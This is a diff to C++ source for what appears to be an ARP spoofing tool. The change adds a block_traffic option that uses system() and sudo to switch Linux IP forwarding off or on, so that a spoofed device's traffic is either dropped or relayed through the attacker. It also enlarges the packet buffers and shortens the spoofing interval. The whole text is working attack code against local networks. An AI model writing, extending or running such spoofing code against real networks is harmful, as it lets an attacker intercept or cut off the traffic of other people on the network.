@@ -25,7 +25,7 @@ mac_addr arp_conn_client::search_for_device(std::string priv_ip) {
         throw "can't convert device's ip";
 
 
-#define BUFF_LEN 512
+#define BUFF_LEN 1024
     char request[BUFF_LEN];
     memset(request, 0, BUFF_LEN);
 
@@ -45,7 +45,7 @@ mac_addr arp_conn_client::search_for_device(std::string priv_ip) {
     memcpy(arp_header->arp_tpa, &target_ip, sizeof(arp_header->arp_tpa));
 
 
-#define BUFF_LEN 512
+#define BUFF_LEN 1024
     char reply[BUFF_LEN];
     while (true) {
 
@@ -76,7 +76,7 @@ mac_addr arp_conn_client::search_for_device(std::string priv_ip) {
 }
 
 void arp_conn_client::spoof_as_device(std::string device,
-                                      std::vector<std::pair<mac_addr, std::string>>& victim_devices) {
+                                      std::vector<std::pair<mac_addr, std::string>>& victim_devices, bool block_traffic) {
 
 //    struct mac_addr my_mac = ether_client->my_mac;
     struct mac_addr my_mac = get_my_mac_address("enp0s3");
@@ -85,12 +85,12 @@ void arp_conn_client::spoof_as_device(std::string device,
         throw "can't convert device's ip";
 
 
-#define BUFF_LEN 512
+#define BUFF_LEN 1024
     char buff[BUFF_LEN];
     memset(buff, 0, BUFF_LEN);
 
 
-    // setup arp
+    // prepare arp
     struct ether_arp *arp_header = (struct ether_arp *) buff; // arp_header header
     arp_header->arp_hrd = htons(ARPHRD_ETHER); // first arp addr type: mac
     arp_header->arp_pro = htons(ETH_P_IP); // first arp addr type: ip
@@ -101,9 +101,13 @@ void arp_conn_client::spoof_as_device(std::string device,
     memcpy(arp_header->arp_sha, &my_mac, sizeof(arp_header->arp_sha)); // my spoofed mac addr
     memcpy(arp_header->arp_spa, &device_ip, sizeof(arp_header->arp_spa)); // device ip
 
+    // block/allow traffic (linux)
+    if (block_traffic) system("echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward");
+    else system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward");
+
     while (true) {
         using namespace std::chrono_literals;
-        std::this_thread::sleep_for(500ms);
+        std::this_thread::sleep_for(300ms);
 
         if (victim_devices.empty()) { // spoof whole broadcast
             memset(arp_header->arp_tha, 0xff, ETH_ALEN);
